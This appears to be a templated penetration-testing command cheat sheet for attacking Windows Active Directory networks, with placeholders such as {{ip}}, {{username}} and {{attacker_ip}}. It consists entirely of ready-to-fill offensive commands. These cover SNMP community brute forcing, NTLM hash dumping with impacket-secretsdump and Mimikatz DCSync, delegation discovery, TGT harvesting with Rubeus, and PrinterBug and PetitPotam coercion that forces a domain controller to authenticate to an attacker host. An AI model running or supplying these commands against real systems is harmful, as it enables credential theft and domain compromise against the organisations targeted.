commands.command:
nmap -sU -p 161 --script snmp-info,snmp-sysdescr,snmp-interfaces {{ip}}

# Caso tenha SNMP descobrir a community e depois fazer um dump
onesixtyone -c '{{snmp_wordlist}}' {{ip}}
snmpwalk -v2c -c '{{snmp_community}}' {{ip}} 1.3.6.1.2.1.1

# Impacket
impacket-secretsdump '{{domain}}/{{username}}:{{password}}@{{ip}}' -just-dc-ntlm

# Specific user
impacket-secretsdump '{{domain}}/{{username}}:{{password}}@{{ip}}' -just-dc-user {{target_user}}

# Mimikatz (Windows)
mimikatz# lsadump::dcsync /domain:{{domain}} /user:{{target_user}}

# Find unconstrained delegation computers
impacket-findDelegation '{{domain}}/{{username}}:{{password}}' -dc-ip {{dc_ip}}

# Monitor for TGTs (Rubeus on Windows)
.\Rubeus.exe monitor /interval:5 /nowrap

# Coerce authentication (PrinterBug/PetitPotam)
python3 printerbug.py '{{domain}}/{{username}}:{{password}}@{{target_host}}' {{attacker_ip}}
python3 PetitPotam.py {{attacker_ip}} {{dc_ip}}

